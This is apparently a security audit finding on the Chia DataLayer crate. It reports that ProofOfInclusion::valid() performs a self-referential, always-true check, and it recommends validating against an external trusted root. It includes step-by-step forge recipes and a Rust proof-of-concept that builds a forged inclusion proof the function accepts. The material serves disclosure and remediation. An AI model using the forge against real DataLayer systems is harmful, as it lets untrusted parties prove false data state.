### Title
`ProofOfInclusion::valid()` Performs a Self-Referential Check That Is Always True, Allowing Forged Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` in the DataLayer Merkle implementation contains a tautological final check: it compares `existing_hash` against `self.root_hash()`, but `root_hash()` is derived entirely from the proof's own internal data. After the loop completes without returning `false`, `existing_hash` is guaranteed to equal `self.layers.last().combined_hash`, which is exactly what `root_hash()` returns. The final check is therefore always `true`. No externally-known tree root is ever compared against. An attacker who can supply a `ProofOfInclusion` (via deserialization from bytes or Python bindings) can forge a proof of inclusion for any arbitrary key against any arbitrary claimed root hash, and `valid()` will accept it.

### Finding Description

`root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← derived from the proof itself
    } else {
        self.node_hash
    }
}
```

`valid()` is:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()   // ← always true if loop completes
}
```

After the loop, `existing_hash` holds the last `calculated_hash`. The loop body only returns `false` when `calculated_hash != layer.combined_hash`, so if the loop completes, `existing_hash` equals `self.layers.last().combined_hash`. `self.root_hash()` returns exactly `self.layers.last().combined_hash`. The final comparison is therefore a tautology — it is structurally identical to `x == x`.

**Forge scenario (non-empty layers):**
1. Choose any `node_hash = H` (the key the attacker wants to claim is included).
2. Choose any `other_hash = X` and `other_hash_side`.
3. Compute `combined_hash = calculate_internal_hash(H, side, X)`.
4. Construct `ProofOfInclusion { node_hash: H, layers: [ProofOfInclusionLayer { other_hash_side: side, other_hash: X, combined_hash }] }`.
5. `valid()` returns `true`; `root_hash()` returns the attacker-chosen `combined_hash`.

**Forge scenario (empty layers):**
1. Construct `ProofOfInclusion { node_hash: H, layers: [] }`.
2. The loop does not execute; `existing_hash = H`; `root_hash() = H`; `valid()` returns `true`.
3. The attacker claims key `H` is in a tree whose root is `H`.

Both scenarios require zero cryptographic work.

### Impact Explanation

Any consumer that calls `proof.valid()` to authenticate a DataLayer inclusion proof — without separately comparing `proof.root_hash()` against a trusted, externally-stored tree root — will accept a completely forged proof. The `valid()` API is exposed to Python via `py_valid()` and the struct is fully deserializable via `from_bytes` / `from_json_dict`. An untrusted peer can supply a serialized `ProofOfInclusion` that passes `valid()` while asserting the presence of any key in any claimed tree state. This lets untrusted input prove invalid DataLayer state, matching the allowed High impact: *DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion or lets untrusted input prove invalid state.*

### Likelihood Explanation

`ProofOfInclusion` is a `Streamable` type with full Python bindings (`from_bytes`, `from_json_dict`, `from_py_object`). Any DataLayer peer exchange that deserializes a proof from an untrusted source and validates it solely with `proof.valid()` is exploitable. The existing tests and fuzz targets only call `valid()` on proofs generated internally by `get_proof_of_inclusion`, so the tautology has not been caught. The forge requires no cryptographic capability — only the ability to construct a well-formed struct.

### Recommendation

`valid()` must accept an externally-known root hash and compare the final accumulated hash against it:

```rust
pub fn valid_against_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root   // compare against external root, not self.root_hash()
}
```

The no-argument `valid()` / `py_valid()` should either be removed or made to always return `false` to prevent misuse. All call sites must be updated to supply the trusted root.

### Proof of Concept

```rust
use chia_datalayer::{Hash, ProofOfInclusion, ProofOfInclusionLayer, Side};

fn forge_proof(claimed_key_hash: Hash) -> ProofOfInclusion {
    // Pick any other_hash
    let other_hash: Hash = [0xAB; 32];
    // Compute a valid combined_hash so the loop passes
    let combined_hash = chia_datalayer::calculate_internal_hash(
        &claimed_key_hash,
        Side::Left,
        &other_hash,
    );
    ProofOfInclusion {
        node_hash: claimed_key_hash,
        layers: vec![ProofOfInclusionLayer {
            other_hash_side: Side::Left,
            other_hash,
            combined_hash,
        }],
    }
}

fn main() {
    let fake_key: Hash = [0xFF; 32]; // key NOT in any real tree
    let proof = forge_proof(fake_key);
    assert!(proof.valid());           // passes — tautological check
    // proof.root_hash() returns attacker-controlled combined_hash
    println!("Forged proof accepted. Claimed root: {:?}", proof.root_hash());
}
```
